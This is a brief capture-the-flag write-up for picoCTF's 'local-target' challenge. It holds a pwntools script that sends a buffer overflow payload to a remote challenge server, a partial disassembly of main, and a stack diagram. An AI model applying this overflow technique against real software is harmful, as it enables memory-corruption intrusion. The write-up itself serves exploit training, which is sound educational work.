# local-target

```python
from pwn import *
import binascii

context.log_level = 'error'

# r = process("./local-target")
r = remote("saturn.picoctf.net", 61750)
r.recvuntil(b"Enter a string:")
r.sendline(b"A"*24 + p64(65))
r.recvall()
```

The disassembled code is as follows:

```
0000000000401236 <main>:
  401236:	f3 0f 1e fa          	endbr64
  40123a:	55                   	push   %rbp
  40123b:	48 89 e5             	mov    %rsp,%rbp
  40123e:	48 83 ec 20          	sub    $0x20,%rsp
  401242:	c7 45 f8 40 00 00 00 	movl   $0x40,-0x8(%rbp)
  401249:	48 8d 3d b4 0d 00 00 	lea    0xdb4(%rip),%rdi        # 402004 <_IO_stdin_used+0x4>
  401250:	b8 00 00 00 00       	mov    $0x0,%eax
  401255:	e8 96 fe ff ff       	call   4010f0 <printf@plt>
  40125a:	48 8b 05 0f 2e 00 00 	mov    0x2e0f(%rip),%rax        # 404070 <stdout@GLIBC_2.2.5>
  401261:	48 89 c7             	mov    %rax,%rdi
```

```
|___________|
|           |
| 0x20 byte |
|           |
|           | <- `num` is stored in -0x8(%rbp)
|___________|
|    rbp    |

```
